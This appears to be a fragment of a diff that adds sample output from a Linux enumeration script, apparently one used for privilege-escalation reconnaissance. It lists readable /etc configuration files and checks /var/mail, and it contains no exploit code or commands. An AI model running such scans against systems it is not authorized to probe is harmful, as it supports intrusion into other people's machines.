+-rw-r--r--  1 root root 585 Oct  7  2009 /etc/yp.conf
+-rw-r--r--  1 root root 1895 May  2  2007 /etc/nscd.conf
+-rw-r--r--  1 root root 3058 Oct  7  2009 /etc/smartd.conf
+-rw-r-----  1 root root 450 May  2  2007 /etc/auditd.conf
+-rw-r--r--  1 root root 80 Jan 25 22:40 /etc/resolv.conf
+-rw-r--r--  1 root root 23488 Feb 21  2005 /etc/jwhois.conf
+-rw-r--r--  1 root root 134 May  2  2007 /etc/pwdb.conf
+-rw-r--r--  1 root root 2281 Oct  7  2009 /etc/krb.conf
+-rw-r--r--  1 root root 296 Aug 21  2005 /etc/updatedb.conf
+-rw-r--r--  1 root root 833 Aug 13  2006 /etc/gssapi_mech.conf
+-rw-r--r--  1 root root 505 Oct 20  2006 /etc/logrotate.conf
+-rw-r--r--  1 root root 17 Jul 23  2000 /etc/host.conf
+-rw-r--r--  1 root root 2657 May  2  2007 /etc/warnquota.conf
+-rw-r--r--  1 root root 615 Oct  7  2009 /etc/krb5.conf
+-rw-r--r--  1 root root 759 Jun  1  2009 /etc/pear.conf
+-rw-r--r--  1 root root 153 Feb 21  2005 /etc/esd.conf
+-rw-r--r--  1 root root 1983 Feb 21  2005 /etc/mtools.conf
+-rw-r--r--  1 root root 463 May  2  2007 /etc/cpuspeed.conf
+-rw-r--r--  1 root root 2374 Oct  7  2009 /etc/libuser.conf
+-rw-r--r--  1 root root 2434 May  5  2007 /etc/ntp.conf
+-rw-r--r--  1 root root 821 Oct  1  2004 /etc/prelink.conf
+-rw-r--r--  1 root root 1756 May 17  2006 /etc/gpm-root.conf
+-rw-r--r--  1 root root 177 May  3  2007 /etc/idmapd.conf
+-rw-r--r--  1 root root 0 Feb 21  2005 /etc/wvdial.conf
+-rw-r--r--  1 root root 8738 Oct  7  2009 /etc/ldap.conf
+-rw-r--r--  1 root root 51 Oct 12  2009 /etc/modprobe.conf
+-rw-r--r--  1 root root 289 Aug 21  2005 /etc/xinetd.conf
+
+
+[-] Any interesting mail in /var/mail:
+lrwxrwxrwx  1 root root 10 Oct  7  2009 /var/mail -> spool/mail
+
+
+### SCAN COMPLETE ####################################
+
